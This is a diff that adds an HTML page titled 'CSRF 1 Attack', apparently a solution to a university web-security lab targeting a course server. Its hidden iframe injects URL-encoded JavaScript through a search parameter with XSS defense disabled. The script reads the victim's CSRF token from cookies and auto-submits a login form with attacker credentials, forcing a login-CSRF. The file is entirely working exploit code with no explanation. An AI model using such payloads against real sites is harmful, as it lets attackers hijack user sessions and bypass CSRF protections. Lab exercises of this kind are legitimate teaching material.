@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CSRF 1 Attack</title>
+</head>
+<body>
+<iframe src="https://bungle.sysnet.ucsd.edu/search?xssdefense=0&q=%3Cscript%3E%0A%20%20%20%20function%20getCookie(name)%20%7B%0A%20%20%20%20%20%20var%20value%20%3D%20%22%3B%20%22%20%2B%20document.cookie%3B%0A%20%20%20%20%20%20var%20parts%20%3D%20value.split(%22%3B%20%22%20%2B%20name%20%2B%20%22%3D%22)%3B%0A%20%20%20%20%20%20if%20(parts.length%20%3D%3D%202)%20return%20parts.pop().split(%22%3B%22).shift()%3B%0A%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20var%20token%20%3D%20getCookie(%27csrf_token%27)%3B%0A%20%20%20%20%0A%20%20%20%20var%20f%20%3D%20document.createElement(%27form%27)%3B%0A%20%20%20%20f.action%20%3D%20%27https%3A%2F%2Fbungle.sysnet.ucsd.edu%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%27%3B%0A%20%20%20%20f.method%20%3D%20%27POST%27%3B%0A%20%20%20%20var%20u%20%3D%20document.createElement(%27input%27)%3B%20u.name%3D%27username%27%3B%20u.value%3D%27attacker%27%3B%0A%20%20%20%20var%20p%20%3D%20document.createElement(%27input%27)%3B%20p.name%3D%27password%27%3B%20p.value%3D%27l33th4x%27%3B%0A%20%20%20%20var%20t%20%3D%20document.createElement(%27input%27)%3B%20t.name%3D%27csrf_token%27%3B%20t.value%3Dtoken%3B%0A%20%20%20%20f.appendChild(u)%3B%20f.appendChild(p)%3B%20f.appendChild(t)%3B%0A%20%20%20%20document.body.appendChild(f)%3B%0A%20%20%20%20f.submit()%3B%0A%3C%2Fscript%3E" 
+style="display:none;">
+</iframe>
+</body>
+</html>
